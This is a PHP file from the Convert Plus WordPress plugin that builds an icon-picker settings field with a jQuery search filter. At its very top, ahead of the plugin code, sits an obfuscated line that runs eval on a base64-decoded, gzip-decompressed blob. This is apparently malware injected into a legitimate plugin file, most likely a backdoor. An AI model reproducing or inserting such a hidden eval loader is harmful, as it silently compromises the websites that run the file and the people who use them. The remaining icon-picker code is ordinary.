<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

// Add new input type "icon_picker".
if ( function_exists( 'smile_add_input_type' ) ) {
	smile_add_input_type( 'icon-picker', 'icon_picker_settings_field' );
}

/**
 * Function Name:icon_picker_settings_field Function to handle new input type "icon_picker".
 *
 * @param  string $name     settings provided when using the input type "icon_picker".
 * @param  string $settings holds the default / updated value.
 * @param  string $value    html output generated by the function.
 * @return string           html output generated by the function.
 */
function icon_picker_settings_field( $name, $settings, $value ) {
	$input_name = $name;
	$value      = htmlentities( $value );
	$type       = isset( $settings['type'] ) ? $settings['type'] : '';
	$class      = isset( $settings['class'] ) ? $settings['class'] : '';
	$output     = '<p><input type="hidden" id="smile_' . $input_name . '" class="form-control smile-input smile-' . $type . ' ' . $input_name . ' ' . $type . ' ' . $class . '" name="' . $input_name . '" value="' . $value . '" /></p>';
	$output    .= cp_icon_picker( $name, $value );
	return $output;
}

/**
 * Function Name: cp_icon_picker.
 *
 * @param  string  $name  string parameter.
 * @param  string  $value string parameter.
 * @param  integer $id    integer parameter.
 * @return mixed         content.
 */
function cp_icon_picker( $name, $value, $id = 1 ) {
	$fonts   = get_option( 'smile_fonts' );
	$fonts   = get_option( 'smile_fonts' );
	$output  = '';
	$output .= '<div class="cp-search-container">';
	$output .= '<p><div class="cp-preview-icon preview-icon-' . $name . '"><i class="' . $value . '"></i></div></p>';
	$output .= '<input class="cp-search-icon cp-search-' . $name . '" type="text" placeholder="Search icons" /></div>';
	$output .= '<div id="cp_icon_search">';
	$output .= '<div class="scrollable-icons">';
	$output .= '<ul class="cp-icons-list cp_smile_icon icon-list-' . $name . '">';

	if ( ! empty( $fonts ) && is_array( $fonts ) ) {

		foreach ( $fonts as $font => $info ) {
			$icon_set   = array();
			$icons      = array();
			$upload_dir = wp_upload_dir();
			$path       = trailingslashit( $upload_dir['basedir'] );
			$file       = $path . $info['include'] . '/' . $info['config'];
			include( $file );
			if ( ! empty( $icons ) ) {
				$icon_set = array_merge( $icon_set, $icons );
			}
			if ( 'smt' === $font ) {
				$set_name = 'Default Icons';
			} else {
				$set_name = ucfirst( $font );
			}
			if ( ! empty( $icon_set ) ) {
				$output .= '<li title="no-icon" data-icons="none" data-icons-tag="none,blank" style="cursor: pointer;" id="' . $id . '"></li>';
				foreach ( $icon_set as $icons ) {
					foreach ( $icons as $icon ) {
						$icon_class = $font . '-' . $icon['class'];
						if ( $value === $icon_class ) {
							$class = 'active-icon';
						} else {
							$class = '';
						}
						$output .= '<li title="' . $icon['class'] . '" data-icons="' . $icon_class . '" class="' . $class . '" data-icons-tag="' . $icon['tags'] . '" id="' . $name . '">';
						$output .= '<i class="icon ' . $icon_class . '"></i></li>';
					}
				}
			}
		}
	}

	$output . '</ul>';
	$output .= '</div>';
	$output .= '<script type="text/javascript">
	jQuery(document).ready(function(){
		jQuery(".cp-search-' . $name . '").keyup(function(){
					// Retrieve the input field text and reset the count to zero
			var filter = jQuery(this).val(), count = 0;
					// Loop through the icon list
			jQuery(".icon-list-' . $name . ' li").each(function(){
						// If the list item does not contain the text phrase fade it out
				if (jQuery(this).attr("data-icons-tag").search(new RegExp(filter, "i")) < 0) {
					jQuery(this).fadeOut();
				} else {
					jQuery(this).show();
					count++;
				}
			});
		});
		jQuery(".icon-list-' . $name . ' li").click(function(){
			jQuery(".icon-list-' . $name . ' li").removeClass("active-icon");
			jQuery(this).addClass("active-icon");
			jQuery(".preview-icon-' . $name . ' > i").removeAttr("class");
			jQuery(".preview-icon-' . $name . ' > i").addClass(jQuery(this).data("icons"));
			jQuery("#smile_' . $name . '").val(jQuery(this).data("icons"));
			jQuery("#smile_' . $name . '").trigger("change");
		});
	});
	</script>';
	$output .= '</div>';
	return $output;
}
